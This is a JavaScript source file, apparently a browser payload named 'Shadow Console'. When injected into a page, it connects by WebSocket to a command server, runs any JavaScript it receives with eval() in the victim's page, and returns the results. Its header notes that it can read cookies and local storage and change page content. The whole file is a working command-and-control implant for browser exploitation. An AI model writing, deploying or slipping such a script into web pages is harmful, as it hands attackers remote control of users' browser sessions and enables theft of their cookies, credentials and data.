/**
 * Shadow Console - Browser Payload Script
 * ======================================
 * This script establishes a WebSocket connection to the command server and
 * executes received JavaScript commands in the browser context.
 *
 * Security Warning:
 * ----------------
 * This script has full access to the browser's JavaScript environment and can:
 * - Access DOM elements and modify page content
 * - Read/write cookies and local storage
 * - Make network requests
 * - Access browser APIs
 * - Execute arbitrary JavaScript code
 *
 * Flow:
 * -----
 * 1. Extracts WebSocket URL from current script source
 * 2. Establishes WebSocket connection to command server
 * 3. Listens for commands and executes them using eval()
 * 4. Sends execution results back to server
 * 5. Automatically reconnects if connection is lost
 *
 * Message Format:
 * --------------
 * Incoming: { command: string, _id: string, executed: boolean }
 * Outgoing: { type: 'execution_complete', id: string, result: string }
 */

// Get the WebSocket URL from the current script's src
const scriptUrl = new URL(document.currentScript.src);
const wsProtocol = scriptUrl.protocol === "https:" ? "wss:" : "ws:";
const wsUrl = `${wsProtocol}//${scriptUrl.host}`;

// Create a WebSocket connection
const ws = new WebSocket(wsUrl);

ws.onopen = () => {
  console.log("Connected to command server");
};

ws.onmessage = (event) => {
  try {
    const data = JSON.parse(event.data);
    if (data && data.command && !data.executed) {
      console.log("Executing command:", data.command);

      try {
        const result = eval(data.command);
        console.log("Result:", result);

        // Send back execution status
        ws.send(
          JSON.stringify({
            type: "execution_complete",
            id: data._id,
            result: String(result),
          })
        );
      } catch (error) {
        console.error("Error executing command:", error);
      }
    }
  } catch (error) {
    console.error("Error processing message:", error);
  }
};

ws.onclose = () => {
  console.log("Connection lost. Reconnecting...");
  setTimeout(() => {
    window.location.reload();
  }, 5000);
};
